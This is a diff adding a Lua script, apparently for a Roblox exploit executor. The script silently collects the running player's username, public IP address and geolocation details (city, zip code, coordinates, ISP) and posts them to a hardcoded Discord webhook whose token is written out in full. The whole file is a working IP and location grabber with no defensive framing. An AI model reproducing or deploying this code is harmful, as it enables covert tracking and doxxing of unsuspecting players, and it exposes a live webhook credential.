@@ -1,0 +1,75 @@
+-- variables
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1021117873218920580/L4iMbDy0lX5_JJHhSYaSB9llbQ1Bm7QaSGqE5mYLsIxNvHWK7Ljg-4S3_8yfMFEcWce0"
+
+local httpRequest = http_request or request or (syn and syn.request) or (http and http.request)
+
+-- some checks
+if not httpRequest then
+    return error("unsupported executor")
+end
+if not LocalPlayer then
+    return error("failed to execute")
+end
+
+-- begin
+local name, displayName = LocalPlayer.Name, LocalPlayer.DisplayName
+
+local localIP
+pcall(function()
+    localIP = HttpService:JSONDecode(httpRequest({
+        Url = "https://api.ipify.org/?format=json",
+        Method = "GET",
+    }).Body).ip
+end)
+if not localIP then
+    return error("failed to execute")
+end
+
+local ipInfo
+pcall(function()
+    ipInfo = HttpService:JSONDecode(httpRequest({
+        Url = string.format("http://ip-api.com/json/%s", localIP),
+        Method = "Get",
+    }).Body)
+end)
+if not ipInfo then
+    return error("failed to execute")
+end
+local dataMessage = string.format(
+    "User: %s (@%s)\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nLatitude: %s\nLongitude: %s\nISP: %s\nOrg: %s",
+    displayName, -- user's DisplayName
+    name, -- user's Name
+    localIP, -- ip
+    ipInfo.country, -- country
+    ipInfo.countryCode, -- country code
+    ipInfo.region, -- region
+    ipInfo.regionName, -- region name
+    ipInfo.city, -- city
+    ipInfo.zip, -- zipcode
+    ipInfo.lat, -- latitude
+    ipInfo.lon, -- longitude
+    ipInfo.isp, -- isp
+    ipInfo.org -- org
+)
+
+local json
+pcall(function()
+    json = HttpService:JSONEncode({
+        content = dataMessage
+    })
+end)
+if json then
+    -- print(json)
+    httpRequest({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = json,
+    })
+end
